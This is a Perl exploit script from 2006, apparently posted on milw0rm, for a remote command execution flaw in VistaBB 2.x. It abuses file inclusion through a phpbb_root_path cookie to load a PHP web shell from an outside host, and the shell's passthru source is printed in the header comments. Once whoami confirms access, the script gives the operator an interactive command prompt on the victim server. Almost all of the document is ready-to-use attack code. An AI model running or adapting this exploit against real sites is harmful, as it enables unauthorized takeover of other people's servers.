#!/usr/bin/perl
# Method found and exploit scripted by nukedx
# Contacts> ICQ: 10072 Web: http://www.nukedx.com MAIL/MSN: nukedx@nukedx.com
# Original advisory can be found at: http://www.nukedx.com/?viewdoc=48
# 
# VistaBB <= 2.x Remote Command Execution Exploit
# 
# This exploit comes with it's own php shell setting. If you wanna change it your file must contain this data >
#
# <?php
# echo "_START_\n";
# ini_set("max_execution_time",0);
# error_reporting(0);
# passthru($_REQUEST[command]);
# echo "\n_END_";
# ?>
#
# Copyright 2006 (C) nukedx
#
# Greetz to: WW,xT,php from my team NWPX , str0ke , cha0s , Preddy , Yns , |SaMaN|, Caesar , Ogre and all of my  friends
use IO::Socket;
# Default configuration
$shell = "http://hometown.aol.com/yarivgiladi/sh.php";
# Checking user settings
if(@ARGV != 2) { usage(); }
else { exploit(); }
sub header()
{
  print "\n- NukedX Security Advisory Nr.2006-44\r\n";
  print "- VistaBB <= 2.x Remote Command Execution Exploit\r\n";
}
sub usage() 
{
  header();
  print "- Usage: $0 <host> <path>\r\n";
  print "- <host> -> Victim's host ex: www.victim.com\r\n";
  print "- <path> -> Path to VistaBB ex: /vistabb/ or just /\r\n";
  exit();
}
sub exploit() {
  # User variables
  $host = $ARGV[0];
  $host =~ s/(http:\/\/)//eg;
  $target = $ARGV[1]."includes/functions_mod_user.php";
  $good = 0;
  $c2s = "command=whoami";
  $c2slen = length($c2s);
  print "Trying to connect: $host\r\n";
  $sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => $host, PeerPort => 80) || die "Connection  failed...\r\n";
  print "Connected to victim: $host\r\n";
  print $sock "POST $target HTTP/1.1\n";
  print $sock "Host: $host\n";
  print $sock "Accept: */*\n";
  print $sock "Referer: $host\r\n";
  print $sock "Accept-Language: tr\r\n";
  print $sock "Content-Type: application/x-www-form-urlencoded\r\n";
  print $sock "Accept-Encoding: gzip, deflate\r\n";
  print $sock "User-Agent: NukeZilla\r\n";
  print $sock "Cookie: phpbb_root_path=".$shell."?\r\n";
  print $sock "Content-length: $c2slen\r\n";
  print $sock "Connection: Keep-Alive\r\n";
  print $sock "Cache-Control: no-cache\r\n\r\n";
  print $sock $c2s;
  print $sock "\r\n\r\n";
  while($result = <$sock>)
  {
    if($result =~ /^_END_/)
    {
      $good=0;
      close($sock);
    }
    if($good==1)
    {
      if (!$whoami) {
        $whoami = trim($result);
        print "Logged as $whoami\r\nType exit for exit dont press ctrl+c\r\n";
      }
    }
    if ($good==0) 
    {
      if ($result =~ /Warning: include_once/) { print "Sorry victim is not vulnerable...\r\nClosing exploit...\r\n";sleep(3);exit(); }
    }
    if($result =~ /^_START_/)
    {
      $good=1;
    }
  }
  while()
  {
    print "[".$whoami."@".$host." /]\$ ";
    while(<STDIN>)
    {
      $cmds=$_;
      chomp($cmds);
      last;
    }
    if ($cmds =~ /^exit/) { print "Closing exploit...\r\n";sleep(3);exit(); }
    else { sendcmd(); }
  }
}
sub sendcmd () {
  $c2s = "command=".$cmds;
  $c2slen = length($c2s);
  $sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => $host, PeerPort => 80) || die "Connection lost...\r\n";
  print $sock "POST $target HTTP/1.1\n";
  print $sock "Host: $host\n";
  print $sock "Accept: */*\n";
  print $sock "Referer: $host\r\n";
  print $sock "Accept-Language: tr\r\n";
  print $sock "Content-Type: application/x-www-form-urlencoded\r\n";
  print $sock "Accept-Encoding: gzip, deflate\r\n";
  print $sock "User-Agent: NukeZilla\r\n";
  print $sock "Cookie: phpbb_root_path=".$shell."?\r\n";
  print $sock "Content-length: $c2slen\r\n";
  print $sock "Connection: Keep-Alive\r\n";
  print $sock "Cache-Control: no-cache\r\n\r\n";
  print $sock $c2s;
  print $sock "\r\n\r\n";
  while($result = <$sock>)
  {
    if($result =~ /^_END_/)
    {
      $good=0;
      close($sock);
    }
    if($good==1)
    {
      print $result;
    }
    if ($good==0) 
    {
      if ($result =~ /Warning: include_once/) { print "Sorry victim is not vulnerable or patched!...\r\nClosing exploit...\r\n";sleep(3);exit(); }
    }
    if($result =~ /^_START_/)
    {
      $good=1;
    }
  }
}
sub trim($)
{
  	my $string = shift;
  	$string =~ s/^\s+//;
  	$string =~ s/\s+$//;
  	return $string;
} 

# nukedx.com [2006-08-24]

# milw0rm.com [2006-08-23]